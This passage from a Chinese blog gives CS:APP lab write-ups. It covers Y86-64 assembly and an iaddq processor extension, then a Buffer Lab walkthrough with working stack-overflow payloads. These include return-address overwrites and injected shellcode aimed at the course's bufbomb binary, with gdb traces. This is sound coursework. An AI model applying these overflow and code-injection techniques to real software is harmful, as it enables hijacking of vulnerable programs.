%rdi,%rdi</span><br><span class="line">        je exit_</span><br><span class="line">        # long val &#x3D; ls-&gt;val</span><br><span class="line">        mrmovq (%rdi),%rbx</span><br><span class="line">        # 先保存rax</span><br><span class="line">        rrmovq %rax,%rcx</span><br><span class="line">        # ls-&gt;next</span><br><span class="line">        mrmovq 8(%rdi),%rdi</span><br><span class="line">        # 递归</span><br><span class="line">        call rsum_list</span><br><span class="line">        # 返回值加上递归函数的返回值</span><br><span class="line">        addq %rcx,%rax</span><br><span class="line">        # 返回值加上当前链表节点的值</span><br><span class="line">        addq %rbx,%rax</span><br><span class="line">        </span><br><span class="line">exit_:</span><br><span class="line">		popq %rcx</span><br><span class="line">		popq %rbx</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./yas rsum.ys &amp;&amp; ./yis rsum.yo</span><br><span class="line">Stopped in 56 steps at PC = 0x13.  Status 'HLT', CC Z=0 S=0 O=0</span><br><span class="line">Changes to registers:</span><br><span class="line"><span class="meta">%</span><span class="bash">rax:   0x0000000000000000      0x0000000000000cba</span></span><br><span class="line"><span class="meta">%</span><span class="bash">rsp:   0x0000000000000000      0x0000000000000200</span></span><br><span class="line"></span><br><span class="line">Changes to memory:</span><br><span class="line">0x01a0: 0x0000000000000000      0x0000000000000c00</span><br><span class="line">0x01a8: 0x0000000000000000      0x000000000000008c</span><br><span class="line">0x01b8: 0x0000000000000000      0x00000000000000b0</span><br><span class="line">0x01c0: 0x0000000000000000      0x000000000000008c</span><br><span class="line">0x01d0: 0x0000000000000000      0x000000000000000a</span><br><span class="line">0x01d8: 0x0000000000000000      0x000000000000008c</span><br><span class="line">0x01f0: 0x0000000000000000      0x000000000000005b</span><br><span class="line">0x01f8: 0x0000000000000000      0x0000000000000013</span><br></pre></td></tr></table></figure>

<h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><p>第三个小实验我们要实现复制内存的操作，并计算校验和，应该没啥难度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># copy.ys</span><br><span class="line">.pos 0</span><br><span class="line">        irmovq stack, %rsp</span><br><span class="line">        call main</span><br><span class="line">        halt</span><br><span class="line">.align 8</span><br><span class="line"># Source block</span><br><span class="line">src:</span><br><span class="line">        .quad 0x00a</span><br><span class="line">        .quad 0x0b0</span><br><span class="line">        .quad 0xc00</span><br><span class="line"># Destination block</span><br><span class="line">dest:</span><br><span class="line">        .quad 0x111</span><br><span class="line">        .quad 0x222</span><br><span class="line">        .quad 0x333</span><br><span class="line">main:</span><br><span class="line">		irmovq src,%rdi</span><br><span class="line">		irmovq dest,%rsi</span><br><span class="line">		irmovq $3,%rdx</span><br><span class="line">		call copy_block</span><br><span class="line">		ret</span><br><span class="line"></span><br><span class="line">copy_block:</span><br><span class="line">		pushq %rbx</span><br><span class="line">		pushq %r9</span><br><span class="line">		pushq %r8</span><br><span class="line">		irmovq $8, %r8</span><br><span class="line">		irmovq $1, %r9</span><br><span class="line">		xorq %rax,%rax</span><br><span class="line">loop:</span><br><span class="line">		subq %r9,%rdx</span><br><span class="line">		jl exit_</span><br><span class="line">		mrmovq (%rdi),%rbx</span><br><span class="line">		rmmovq %rbx,(%rsi)</span><br><span class="line">		addq %r8,%rdi</span><br><span class="line">		addq %r8,%rsi</span><br><span class="line">		xorq %rbx,%rax</span><br><span class="line">		jmp loop</span><br><span class="line">exit_:</span><br><span class="line">		popq %r8</span><br><span class="line">		popq %r9</span><br><span class="line">		popq %rbx</span><br><span class="line">		ret</span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> ./yas copy.ys &amp;&amp; ./yis copy.yo</span><br><span class="line">Stopped in 44 steps at PC = 0x13.  Status 'HLT', CC Z=0 S=1 O=0</span><br><span class="line">Changes to registers:</span><br><span class="line"><span class="meta">%</span><span class="bash">rax:   0x0000000000000000      0x0000000000000cba</span></span><br><span class="line"><span class="meta">%</span><span class="bash">rdx:   0x0000000000000000      0xffffffffffffffff</span></span><br><span class="line"><span class="meta">%</span><span class="bash">rsp:   0x0000000000000000      0x0000000000000200</span></span><br><span class="line"><span class="meta">%</span><span class="bash">rsi:   0x0000000000000000      0x0000000000000048</span></span><br><span class="line"><span class="meta">%</span><span class="bash">rdi:   0x0000000000000000      0x0000000000000030</span></span><br><span class="line"></span><br><span class="line">Changes to memory:</span><br><span class="line">0x0030: 0x0000000000000111      0x000000000000000a</span><br><span class="line">0x0038: 0x0000000000000222      0x00000000000000b0</span><br><span class="line">0x0040: 0x0000000000000333      0x0000000000000c00</span><br><span class="line">0x01f0: 0x0000000000000000      0x000000000000006f</span><br><span class="line">0x01f8: 0x0000000000000000      0x0000000000000013</span><br></pre></td></tr></table></figure>

<h2 id="Part-B"><a href="#Part-B" class="headerlink" title="Part-B"></a>Part-B</h2><p>在这一部分中，我们需要使用硬件描述语言添加一条指令<code>iaddq</code>，具体是在工作目录<code>sim/seq</code>中，完成<code>seq-full.hcl</code>文件中其余的部分。</p>
<p>在开始编码之前，让我们先来完成一些理论部分。</p>
<p>根据所给的PDF提示，我们大概知道该指令格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">字节：         |0   |1   |2   3   4   5   6   7   8   9   |</span><br><span class="line">              --------------------------------------------</span><br><span class="line">iaddq V,rB    |C0  |F rB|               V                |</span><br></pre></td></tr></table></figure>

<p>参照《深入理解计算机系统》教材的图4-18，我们可以完成下表：</p>
<table>
<thead>
<tr>
<th></th>
<th>iaddq</th>
</tr>
</thead>
<tbody><tr>
<td>取指</td>
<td>icode:ifun←M1[PC]<br>rA:rB←M1[PC+1]<br>valC←M8[Pc+2]<br>valP←PC+10</td>
</tr>
<tr>
<td>译码</td>
<td>valB←R[rB]</td>
</tr>
<tr>
<td>执行</td>
<td>valE←valB+valC<br>Set CC</td>
</tr>
<tr>
<td>访存</td>
<td></td>
</tr>
<tr>
<td>写回</td>
<td>R[rB]←valE</td>
</tr>
<tr>
<td>更新PC</td>
<td>PC←valP</td>
</tr>
</tbody></table>
<p>根据上表，我们要修改教材上第278页（第三版中文版）开始的涉及的HCL变量:</p>
<p><strong>1.取指阶段：</strong></p>
<p><code>iaddq</code>需要寄存器:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool need_regids &#x3D;</span><br><span class="line">	icode in &#123; IRRMOVQ, IOPQ, IPUSHQ, IPOPQ, </span><br><span class="line">		     IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125;;</span><br></pre></td></tr></table></figure>

<p><code>iaddq</code>需要变量C:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool need_valC &#x3D;</span><br><span class="line">	icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IJXX, ICALL, IIADDQ &#125;;</span><br></pre></td></tr></table></figure>

<p><strong>2.译码和写回阶段</strong></p>
<p><code>iaddq</code>不需要寄存器A，因此<code>srcA</code>不用改。</p>
<p><code>iaddq</code>需要寄存器B:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">word srcB &#x3D; [</span><br><span class="line">	icode in &#123; IOPQ, IRMMOVQ, IMRMOVQ, IIADDQ  &#125; : rB;</span><br><span class="line">	icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE;  # Don&#39;t need register</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p>在写回阶段，端口E的目的寄存器是rB:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">word dstE &#x3D; [</span><br><span class="line">	icode in &#123; IRRMOVQ &#125; &amp;&amp; Cnd : rB;</span><br><span class="line">	icode in &#123; IIRMOVQ, IOPQ, IIADDQ&#125; : rB;</span><br><span class="line">	icode in &#123; IPUSHQ, IPOPQ, ICALL, IRET &#125; : RRSP;</span><br><span class="line">	1 : RNONE;  # Don&#39;t write any register</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p><code>iaddq</code>不涉及内存读写，因此<code>dstM</code>不需要更改。</p>
<p><strong>3.执行阶段</strong></p>
<p>执行阶段，aluA来自valC,aluB来自valB:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">word aluA &#x3D; [</span><br><span class="line">	icode in &#123; IRRMOVQ, IOPQ &#125; : valA;</span><br><span class="line">	icode in &#123; IIRMOVQ, IRMMOVQ, IMRMOVQ, IIADDQ &#125; : valC;</span><br><span class="line">	icode in &#123; ICALL, IPUSHQ &#125; : -8;</span><br><span class="line">	icode in &#123; IRET, IPOPQ &#125; : 8;</span><br><span class="line">	# Other instructions don&#39;t need ALU</span><br><span class="line">];</span><br><span class="line">word aluB &#x3D; [</span><br><span class="line">	icode in &#123; IRMMOVQ, IMRMOVQ, IOPQ, ICALL, </span><br><span class="line">		      IPUSHQ, IRET, IPOPQ, IIADDQ &#125; : valB;</span><br><span class="line">	icode in &#123; IRRMOVQ, IIRMOVQ &#125; : 0;</span><br><span class="line">	# Other instructions don&#39;t need ALU</span><br><span class="line">];</span><br></pre></td></tr></table></figure>

<p>alufun不需要更改，但是需要更新条件码寄存器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool set_cc &#x3D; icode in &#123; IOPQ, IIADDQ &#125;;</span><br></pre></td></tr></table></figure>

<p><strong>4.访存阶段</strong></p>
<p><code>iaddq</code>不涉及内存读写，因此mem_addr、mem_data、mem_write、mem_read都无需更改。</p>
<p><strong>5.更新PC阶段</strong></p>
<p>这一部分也不需要更改。</p>
<p>除了上述5个阶段涉及的一些变量意外，下面的也要进行相应修改：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bool instr_valid &#x3D; icode in </span><br><span class="line">	&#123; INOP, IHALT, IRRMOVQ, IIRMOVQ, IRMMOVQ, IMRMOVQ,</span><br><span class="line">	       IOPQ, IJXX, ICALL, IRET, IPUSHQ, IPOPQ, IIADDQ &#125;;</span><br></pre></td></tr></table></figure>

<p>测试：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd sim</span><br><span class="line"><span class="meta">#</span><span class="bash"> 构建新的仿真器</span></span><br><span class="line">make VERSION=full</span><br><span class="line">cd seq</span><br><span class="line"><span class="meta">#</span><span class="bash"> 通过单个的 Y86-64 程序测试我们修改的程序，测试的源码是../y86-code/asumi.ys</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> %rax 变为  0x0000abcdabcdabcd 即说明是正确的</span></span><br><span class="line">./ssim -t ../y86-code/asumi.yo</span><br><span class="line"><span class="meta">#</span><span class="bash"> 使用基准程序来测试我们修改的程序</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 出现一系列 succeeds 则说明是正确的</span></span><br><span class="line">cd ../y86-code; make testssim </span><br><span class="line"><span class="meta">#</span><span class="bash"> 测试除了iaddq和leave之外的所有指令</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 出现 All 600 ISA Checks Succeed 则说明是正确的</span></span><br><span class="line">cd ../ptest; make SIM=../seq/ssim</span><br><span class="line"><span class="meta">#</span><span class="bash"> 测试iaddq指令</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 出现 All 756 ISA Checks Succeed 则说明是正确的</span></span><br><span class="line">cd ../ptest; make SIM=../seq/ssim TFLAGS=-i</span><br></pre></td></tr></table></figure>

<h2 id="Part-C"><a href="#Part-C" class="headerlink" title="Part-C"></a>Part-C</h2><p>经过前面的两道开胃菜，终于进入我们的正题——实现流水线处理器。</p>
<p>在这个部分中，主要任务是修改<code>ncopy.ys</code>和 <code>pipe-full.hcl</code>,使得<code>ncopy.ys</code>运行得足够快。</p>
<p>其实<code>ncopy.ys</code>和 <code>pipe-full.hcl</code>已经实现了目的，即将指定地址的数据复制到另外一个指定地址，并返回正数的个数，只是速度没有达到要求，我们可以看一下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make &amp;&amp; (cd ../y86-code; make testpsim) &amp;&amp; (cd ../ptest; make SIM=../pipe/psim TFLAGS=-i)</span><br></pre></td></tr></table></figure>

<p>然后查看分数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> ./benchmark.pl</span><br><span class="line"> ...</span><br><span class="line"> ...</span><br><span class="line"> Average CPE     15.18</span><br><span class="line">Score   0.0/60.0</span><br></pre></td></tr></table></figure>

<p>根据要求，我们要将CPE降到10.5以下才可以拿到分数。</p>
<p>我们可以先着手考虑增加<code>iaddq</code>指令,参照<code>part-B</code>,我们可以很快就可以修改<code>pipe-full.hcl</code>文件，然后将<code>ncopy.ys</code>中适合的指令使用<code>iaddq</code>替换，但是我们现在是流水线处理器，不能简单地进行替换，要考虑控制相关、数据冒险等，改进后的<code>ncopy.ys</code>如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#&#x2F;* $begin ncopy-ys *&#x2F;</span><br><span class="line">##################################################################</span><br><span class="line"># ncopy.ys - Copy a src block of len words to dst.</span><br><span class="line"># Return the number of positive words (&gt;0) contained in src.</span><br><span class="line">#</span><br><span class="line"># Include your name and ID here.</span><br><span class="line">#</span><br><span class="line"># Describe how and why you modified the baseline code.</span><br><span class="line">#</span><br><span class="line">##################################################################</span><br><span class="line"># Do not modify this portion</span><br><span class="line"># Function prologue.</span><br><span class="line"># %rdi &#x3D; src, %rsi &#x3D; dst, %rdx &#x3D; len</span><br><span class="line">ncopy:</span><br><span class="line"></span><br><span class="line">##################################################################</span><br><span class="line"># You can modify this portion</span><br><span class="line">	# Loop header</span><br><span class="line">	xorq %rax,%rax				# count &#x3D; 0;</span><br><span class="line">	andq %rdx,%rdx				# len &lt;&#x3D; 0?</span><br><span class="line">	jg Loop						# if so, goto Done:</span><br><span class="line"></span><br><span class="line">Loop:	mrmovq (%rdi), %r10		# read val from src...</span><br><span class="line">	iaddq $8, %rdi				# src++</span><br><span class="line">	iaddq $-1, %rdx				# len--</span><br><span class="line">	rmmovq %r10, (%rsi)			# ...and store it to dst</span><br><span class="line">	andq %r10, %r10				# val &lt;&#x3D; 0?</span><br><span class="line">	jle Npos					# if so, goto Npos:</span><br><span class="line">	iaddq $1, %rax				# count++</span><br><span class="line">Npos:</span><br><span class="line">	iaddq $8, %rsi				# dst++</span><br><span class="line">	andq %rdx,%rdx				# len &gt; 0?</span><br><span class="line">	jg Loop						# if so, goto Loop:</span><br><span class="line">##################################################################</span><br><span class="line"># Do not modify the following section of code</span><br><span class="line"># Function epilogue.</span><br><span class="line">Done:</span><br><span class="line">	ret</span><br><span class="line">##################################################################</span><br><span class="line"># Keep the following label at the end of your function</span><br><span class="line">End:</span><br><span class="line">#&#x2F;* $end ncopy-ys *&#x2F;</span><br></pre></td></tr></table></figure>

<p><strong>但是没有通过，去看了别人写的，复制过来也不行</strong></p>
<p><strong>可能是环境问题，先这样，不管了</strong></p>
<p><strong>先放放这个实验，后面再回头处理这个</strong></p>
]]></content>
      <categories>
        <category>教程</category>
      </categories>
      <tags>
        <tag>性能调优</tag>
        <tag>仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>CS:APP-Buffer Lab</title>
    <url>/2023/10/01/CS-APP-Buffer-Lab/</url>
    <content><![CDATA[<p><em>CS:APP2e</em>上面的32位旧实验，现已被<em>Attack Lab</em>实验替代。</p>
<p>老规矩，先反汇编</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -d bufbomb &gt; bufbomb.s</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意</strong>： IA-32体系下，过程调用传参与x86-64有些区别，具体需要结合汇编代码进行分析</p>
</blockquote>
<p>生成cookie</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./makecookie yalexin</span></span><br><span class="line">0x56e63394</span><br></pre></td></tr></table></figure>

<h2 id="Level-0-Candle"><a href="#Level-0-Candle" class="headerlink" title="Level 0: Candle"></a>Level 0: Candle</h2><p>本关卡需要我们利用缓冲区溢出，控制程序走到<code>smoke</code>函数<a id="more"></a></p>
<p>相关汇编如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">080491f4 &lt;getbuf&gt;:</span><br><span class="line"> ; 注意，栈中还保留了ebp</span><br><span class="line"> 80491f4:	55                   	push   %ebp</span><br><span class="line"> 80491f5:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 80491f7:	83 ec 38             	sub    $0x38,%esp</span><br><span class="line"> ; buf字符串地址距离栈底0x28个字节</span><br><span class="line"> 80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax</span><br><span class="line"> 80491fd:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 8049200:	e8 f5 fa ff ff       	call   8048cfa &lt;Gets&gt;</span><br><span class="line"> 8049205:	b8 01 00 00 00       	mov    $0x1,%eax</span><br><span class="line"> 804920a:	c9                   	leave</span><br><span class="line"> 804920b:	c3                   	ret</span><br></pre></td></tr></table></figure>

<p>综上，我们输入字符串时候，应输入0x28个字符，然后再输入4个字符，把ebp覆盖，才可以输入我们的返回地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* 0.txt *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 将buf数组全部覆盖 *&#x2F;</span><br><span class="line">00 00 00 00 18 8c 04 08 &#x2F;* 前4个字节覆盖ebp，后4个字节覆盖返回地址 *&#x2F;</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./hex2raw &lt; 0.txt | ./bufbomb -u yalexin  </span></span><br><span class="line">Userid: yalexin</span><br><span class="line">Cookie: 0x56e63394</span><br><span class="line">Type string:Smoke!: You called smoke()</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>

<h2 id="Level-1-Sparkler"><a href="#Level-1-Sparkler" class="headerlink" title="Level 1: Sparkler"></a>Level 1: Sparkler</h2><p>在这以关卡中，我们要调用<code>fizz</code>函数，同时要传入一个变量，下面是<code>fizz</code>函数的部分代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">08048c42 &lt;fizz&gt;:</span><br><span class="line"> 8048c42:	55                   	push   %ebp</span><br><span class="line"> 8048c43:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048c45:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> ; 通过观察，我们可以知道fizz的参数val是通过堆栈的方式传递</span><br><span class="line"> ; 加8是因为要跳过返回地址</span><br><span class="line"> 8048c48:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 8048c4b:	3b 05 08 d1 04 08    	cmp    0x804d108,%eax</span><br></pre></td></tr></table></figure>

<p>因此我们要在栈上放入我们的cookie：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* 1.txt *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 将buf数组全部覆盖 *&#x2F;</span><br><span class="line">00 00 00 00 42 8c 04 08 &#x2F;* 前4个字节覆盖ebp，后4个字节覆盖返回地址 *&#x2F;</span><br><span class="line">42 8c 04 08 94 33 e6 56 &#x2F;* 前4个作为调用fix后的返回地址，我们可以随便设置，后4个是函数参数，即我们的cookie *&#x2F;</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./hex2raw &lt; 1.txt | ./bufbomb -u yalexin    </span></span><br><span class="line">Userid: yalexin</span><br><span class="line">Cookie: 0x56e63394</span><br><span class="line">Type string:Fizz!: You called fizz(0x56e63394)</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>

<h2 id="Level-2-Firecracker"><a href="#Level-2-Firecracker" class="headerlink" title="Level 2: Firecracker"></a>Level 2: Firecracker</h2><p>这一关卡我们要设置全局变量，同时调用bang的时候要传入一个参数，我们先通过gdb查看<code>getbuf</code>函数中字符串<code>buf</code>的地址：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb bufbomb </span><br><span class="line">b getbuf</span><br><span class="line">r -u yalexin    </span><br><span class="line">b</span><br><span class="line">b</span><br><span class="line">EAX  0x55683698 (_reserved+1037976) —▸ 0xf7c3a08e (srandom+14) ◂— add    ebx, 0x1e4f66</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xf7e1f094 (randtbl+20) ◂— 0xe017ddb9</span><br><span class="line"> EDX  0x0</span><br><span class="line"> EDI  0x1</span><br><span class="line"> ESI  0x556865c0 ◂— 0x0</span><br><span class="line"> EBP  0x556836c0 (_reserved+1038016) —▸ 0x556836f0 (_reserved+1038064) —▸ 0x55685ff0 (_reserved+1048560) —▸ 0xffffd3b8 —▸ 0xffffd3f8 ◂— ...</span><br><span class="line"> ESP  0x55683688 (_reserved+1037960) —▸ 0x55683698 (_reserved+1037976) —▸ 0xf7c3a08e (srandom+14) ◂— add    ebx, 0x1e4f66</span><br><span class="line">*EIP  0x8049200 (getbuf+12) —▸ 0xfffaf5e8 ◂— 0xfffaf5e8</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x80491fa &lt;getbuf+6&gt;      lea    eax, [ebp - 0x28]</span><br><span class="line">   0x80491fd &lt;getbuf+9&gt;      mov    dword ptr [esp], eax</span><br><span class="line"> ► 0x8049200 &lt;getbuf+12&gt;     call   Gets                     &lt;Gets&gt;</span><br><span class="line">        arg[0]: 0x55683698 (_reserved+1037976) —▸ 0xf7c3a08e (srandom+14) ◂— add    ebx, 0x1e4f66</span><br><span class="line">        arg[1]: 0xf7e1f484 (unsafe_state) —▸ 0xf7e1f094 (randtbl+20) ◂— 0xe017ddb9</span><br><span class="line">        arg[2]: 0x12e13746</span><br><span class="line">        arg[3]: 0xd7653000</span><br><span class="line"> </span><br><span class="line">   0x8049205 &lt;getbuf+17&gt;     mov    eax, 1</span><br><span class="line">   0x804920a &lt;getbuf+22&gt;     leave  </span><br><span class="line">   0x804920b &lt;getbuf+23&gt;     ret</span><br></pre></td></tr></table></figure>

<p>实际上eax中的值就是我们的buf字符串的地址，为0x55683698。该地址可以方便我们定位我们输入的代码（放到栈上）</p>
<p>查找全局变量<code>global_value</code>的地址比较简单，只需要观察<code>bang</code>函数的汇编代码即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">08048c9d &lt;bang&gt;:</span><br><span class="line"> 8048c9d:	55                   	push   %ebp</span><br><span class="line"> 8048c9e:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 8048ca0:	83 ec 18             	sub    $0x18,%esp</span><br><span class="line"> 8048ca3:	a1 00 d1 04 08       	mov    0x804d100,%eax</span><br><span class="line"> 8048ca8:	3b 05 08 d1 04 08    	cmp    0x804d108,%eax</span><br><span class="line"> 8048cae:	75 26                	jne    8048cd6 &lt;bang+0x39&gt;</span><br><span class="line"> 8048cb0:	89 44 24 08          	mov    %eax,0x8(%esp)</span><br><span class="line"> 8048cb4:	c7 44 24 04 60 a3 04 	movl   $0x804a360,0x4(%esp)</span><br></pre></td></tr></table></figure>

<p>因此全局变量<code>global_value</code>的地址为<code>0x804d100</code>（通过观察<code>fizz</code>函数的汇编，我们可以知道<code>0x804d108</code>是<code>cookie</code>的地址）</p>
<p>下一步我们就是构建修改全部变量、跳转至<code>bang</code>函数的汇编：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 2_code.s</span><br><span class="line">mov    $0x804d100,%eax</span><br><span class="line">movl   $0x56e63394,(%eax)</span><br><span class="line">push   $0x8048c9d # bang 地址入栈</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>生成对应的字节码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c -m32 2_code.s</span><br><span class="line">objdump -d 2_code.o &gt; 2_code.d</span><br><span class="line">cat 2_code.d</span><br><span class="line">2_code.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:   b8 00 d1 04 08          mov    $0x804d100,%eax</span><br><span class="line">   5:   c7 00 94 33 e6 56       movl   $0x56e63394,(%eax)</span><br><span class="line">   b:   68 9d 8c 04 08          push   $0x8048c9d</span><br><span class="line">  10:   c3    					ret</span><br></pre></td></tr></table></figure>

<p>下一步就是开始布局堆栈了，栈上内容大致如下图:</p>
<p><img src="https://cdn.yalexin.top/image-20230731145134933.png" alt="image-20230731145134933"></p>
<p>因此payload为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* 2.txt *&#x2F;</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 &#x2F;* 将buf数组全部覆盖 *&#x2F;</span><br><span class="line">00 00 00 00 c8 36 68 55 &#x2F;* 前4个字节覆盖ebp，后4个字节覆盖返回地址 *&#x2F;</span><br><span class="line">b8 00 d1 04 08 c7 00 94</span><br><span class="line">33 e6 56 68 9d 8c 04 08</span><br><span class="line">c3</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./hex2raw &lt; 2.txt | ./bufbomb -u yalexin   </span></span><br><span class="line">Userid: yalexin</span><br><span class="line">Cookie: 0x56e63394</span><br><span class="line">Type string:Bang!: You set global_value to 0x56e63394</span><br><span class="line">VALID</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>

<h2 id="Level-3-Dynamite"><a href="#Level-3-Dynamite" class="headerlink" title="Level 3: Dynamite"></a>Level 3: Dynamite</h2><p>本关卡需要我们回到从<code>getbuf</code>函数回到<code>test</code>函数时候，返回值为我们的<code>cookie</code>值，并且还是以正常方式返回，意味着我们不能够破坏<code>test</code>的栈帧。</p>
<p>想要修改返回值，我们可以在程序返回前修改<code>eax</code>的值</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 3_code.s</span></span><br><span class="line">push   $0x56e63394 #  cookie值：0x56e63394 </span><br><span class="line">pop %eax #  修改返回值 </span><br><span class="line">push $0x8048dbe #  调用getbuf后的返回地址 </span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>生成对应的字节码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -c -m32 3_code.s</span><br><span class="line">objdump -d 3_code.o &gt; 3_code.d</span><br><span class="line">cat 3_code.d</span><br><span class="line">3_code.o：     文件格式 elf32-i386</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000 &lt;.text&gt;:</span><br><span class="line">   0:   68 94 33 e6 56          push   $0x56e63394</span><br><span class="line">   5:   58                      pop    %eax</span><br><span class="line">   6:   68 be 8d 04 08          push   $0x8048dbe</span><br><span class="line">   b:   c3                      ret</span><br></pre></td></tr></table></figure>

<p>下一步就是开始布局堆栈了:</p>
<p><img src="https://cdn.yalexin.top/image-20230731214954748.png" alt="image-20230731214954748"></p>
<p>为了得到旧的<code>ebp</code>的值，我们可以借助gdb，将断点下到getbuf处：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> gdb bufbomb</span><br><span class="line"> b getbuf</span><br><span class="line"> run -u yalexin</span><br><span class="line"> *EAX  0xe9e9dc4</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0xf7e1f094 (randtbl+20) ◂— 0xe04ebb5a</span><br><span class="line"> EDX  0x0</span><br><span class="line"> EDI  0x1</span><br><span class="line"> ESI  0x556865c0 ◂— 0x0</span><br><span class="line"> EBP  0x556836c0 (_reserved+1038016) —▸ 0x556836f0 (_reserved+1038064) —▸ 0x55685ff0 (_reserved+1048560) —▸ 0xffffd3b8 —▸ 0xffffd3f8 ◂— ...</span><br><span class="line"> ESP  0x55683688 (_reserved+1037960) ◂— 0x2774 /* "t'" */</span><br><span class="line"> EIP  0x80491fa (getbuf+6) ◂— lea    eax, [ebp - 0x28]</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x80491fa &lt;getbuf+6&gt;      lea    eax, [ebp - 0x28]             &lt;_reserved+1037976&gt;</span><br><span class="line">   0x80491fd &lt;getbuf+9&gt;      mov    dword ptr [esp], eax</span><br><span class="line">   0x8049200 &lt;getbuf+12&gt;     call   Gets                     &lt;Gets&gt;</span><br><span class="line"> </span><br><span class="line">   0x8049205 &lt;getbuf+17&gt;     mov    eax, 1</span><br><span class="line">   0x804920a &lt;getbuf+22&gt;     leave  </span><br><span class="line">   0x804920b &lt;getbuf+23&gt;     ret    </span><br><span class="line"> </span><br><span class="line">   0x804920c &lt;getbufn&gt;       